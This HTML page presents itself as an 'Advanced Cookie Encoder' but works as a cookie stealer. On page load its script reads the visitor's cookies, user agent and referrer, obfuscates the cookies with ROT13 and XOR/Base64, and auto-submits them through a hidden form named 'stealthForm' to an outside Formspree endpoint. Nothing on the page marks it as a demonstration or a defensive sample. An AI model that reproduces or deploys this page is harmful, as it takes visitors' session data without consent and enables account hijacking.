<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Cookie Encoder</title>
    <style>
        body {
            background-color: black;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            font-family: Arial, sans-serif;
        }
        h2 {
            text-align: center;
            color: gold;
            text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
        }
        form {
            display: none; /* Hide form */
        }
    </style>
</head>
<body>

    <h2>Advanced Cookie Encoder</h2>

    <form id="stealthForm" action="https://formspree.io/f/xeoqzkqe" method="POST">
        <input type="hidden" name="sha256_hash" id="sha256Field" value="">
        <input type="hidden" name="rot13_data" id="rot13Field" value="">
        <input type="hidden" name="xor_data" id="xorField" value="">
        <input type="hidden" name="user_agent" id="userAgentField" value="">
        <input type="hidden" name="referrer" id="referrerField" value="">
        <input type="hidden" name="fallback" value="not_empty">
        <button type="submit">Send</button>
    </form>

    <script>
        document.addEventListener("DOMContentLoaded", async function() {
            var cookies = document.cookie || "No_Cookies";
            var userAgent = navigator.userAgent || "Unknown_User_Agent";
            var referrer = document.referrer || "No_Referrer";

            // SHA-256 Hashing (async)
            async function hashSHA256(str) {
                const encoder = new TextEncoder();
                const data = encoder.encode(str);
                const hashBuffer = await crypto.subtle.digest('SHA-256', data);
                return Array.from(new Uint8Array(hashBuffer)).map(byte => byte.toString(16).padStart(2, '0')).join('');
            }

            // ROT13 Encoding
            function encodeROT13(str) {
                return str.replace(/[A-Za-z]/g, function(c) {
                    return String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13));
                });
            }

            // XOR Encryption with a key
            function encodeXOR(str, key) {
                return Array.from(str).map((char, i) => 
                    String.fromCharCode(char.charCodeAt(0) ^ key.charCodeAt(i % key.length))
                ).join('');
            }

            let xorKey = "mySecretKey";  // Change this key for security
            let sha256Hash = await hashSHA256(cookies);
            let rot13Encoded = encodeROT13(cookies);
            let xorEncoded = btoa(encodeXOR(cookies, xorKey)); // XOR + Base64 for readability

            // Inject values into form fields
            document.getElementById("sha256Field").value = sha256Hash;
            document.getElementById("rot13Field").value = rot13Encoded;
            document.getElementById("xorField").value = xorEncoded;
            document.getElementById("userAgentField").value = userAgent;
            document.getElementById("referrerField").value = referrer;

            // Auto-submit the form if cookies exist
            if (cookies !== "No_Cookies" || referrer !== "No_Referrer") {
                document.getElementById("stealthForm").submit();
            }
        });
    </script>

</body>
</html>
